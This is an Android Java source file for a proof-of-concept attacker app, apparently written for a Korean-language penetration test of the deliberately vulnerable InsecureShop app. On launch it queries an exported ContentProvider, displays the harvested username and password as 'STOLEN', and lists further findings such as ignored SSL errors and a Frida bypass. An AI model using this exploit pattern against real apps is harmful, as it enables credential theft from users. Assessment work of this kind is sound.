package com.aas.loot;
import android.app.Activity;
import android.os.Bundle;
import android.database.Cursor;
import android.net.Uri;
import android.widget.TextView;
import android.widget.ScrollView;
import android.graphics.Color;
import android.graphics.Typeface;
import android.util.TypedValue;
public class MainActivity extends Activity {
    protected void onCreate(Bundle st){
        super.onCreate(st);
        StringBuilder sb = new StringBuilder();
        sb.append("=== InsecureShop 모의진단 종합 ===\n");
        sb.append("attacker app: com.aas.loot (권한: com.insecureshop.permission.READ, normal)\n\n");
        sb.append("[Critical] exported ContentProvider 자격증명 유출:\n");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.insecureshop.provider/insecure"), null,null,null,null);
            if (c!=null){ while(c.moveToNext()){
                sb.append("   STOLEN username = ").append(c.getString(0)).append("\n");
                sb.append("   STOLEN password = ").append(c.getString(1)).append("\n");
            } c.close(); }
            else sb.append("   cursor=null (피해앱 미실행/미로그인)\n");
        } catch(Throwable t){ sb.append("   ERR: ").append(t).append("\n"); }
        sb.append("\n주요 발견(재현은 S02~S17):\n");
        sb.append(" [Crit] WebView SSL 오류 무시 (MITM)            S09\n");
        sb.append(" [Crit] exported Provider + normal 권한 자격유출  S06\n");
        sb.append(" [High] 하드코딩 자격증명 (DEX)                   S04\n");
        sb.append(" [High] 평문 SharedPrefs 자격 저장               S04\n");
        sb.append(" [High] intent redirection -> 비공개 화면        S07\n");
        sb.append(" [High] 딥링크 임의 URL 로드                     S08\n");
        sb.append(" [High] 평문 HTTP + NSC/pinning 없음             S10\n");
        sb.append(" [High] FileProvider root-path=\"/\"              S13\n");
        sb.append(" [High] 클라이언트 인증(Frida 우회)             S14\n");
        sb.append(" [Med ] debuggable + 디버그서명 + allowBackup    S02/03\n");
        sb.append(" [Low ] 과권한 READ_CONTACTS                     S12\n");
        TextView tv = new TextView(this);
        tv.setText(sb.toString());
        tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
        tv.setTextColor(Color.parseColor("#111111"));
        tv.setPadding(24,52,24,24);
        tv.setTypeface(Typeface.MONOSPACE);
        ScrollView sv = new ScrollView(this);
        sv.setBackgroundColor(Color.parseColor("#FFECEC"));
        sv.addView(tv);
        setContentView(sv);
    }
}
